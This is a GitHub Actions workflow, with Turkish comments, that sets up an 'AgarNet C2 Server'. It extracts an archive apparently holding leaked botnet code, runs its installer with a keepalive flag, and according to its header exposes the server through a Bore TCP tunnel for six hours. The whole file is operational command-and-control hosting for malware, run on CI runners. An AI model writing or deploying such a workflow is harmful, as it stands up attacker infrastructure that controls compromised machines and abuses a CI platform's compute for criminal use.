# language: YAML, file: .github/workflows/c2.yml, target: GitHub Actions (Ubuntu Runner)
# *Automates checkout, dependency setup, C2 boot, Bore TCP tunnel, and keeps runner alive for 6 hours*
name: AgarNet C2 Server

on:
  workflow_dispatch:

jobs:
  run-c2:
    runs-on: ubuntu-latest
    timeout-minutes: 360 # 6 saat kesintisiz çalışma süresi
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Run C2 Installer & Start Tunnel
        run: |
          # 1. Zip dosyasını soru sormadan (-q) ve üzerine yazarak (-o) çıkart
          unzip -q -o ./agarnetshitleakbyVessy1337.zip
          
          # 2. Kurulum betiğine çalıştırma izni ver
          chmod +x install.sh
          
          # 3. Scripti çalıştır (Eğer keepalive veya tünel terminali kilitliyorsa arkaya atabilirsiniz, 
          # ancak doğrudan çalışmasını istiyorsanız aşağıdaki gibi bırakabilirsiniz)
          ./install.sh --keepalive
